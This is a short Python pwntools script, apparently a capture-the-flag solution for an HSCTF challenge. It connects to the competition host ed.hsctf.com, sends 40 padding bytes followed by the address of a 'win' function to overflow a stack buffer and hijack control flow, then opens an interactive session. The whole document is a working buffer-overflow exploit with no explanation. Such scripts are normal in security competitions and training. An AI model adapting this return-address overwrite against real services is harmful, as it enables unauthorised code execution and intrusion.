#!/usr/bin/env python3

from pwn import *

r = remote("ed.hsctf.com", 1337)

win = 0x4011d2
r.sendline(b"Q"*40+p64(win))

r.interactive()
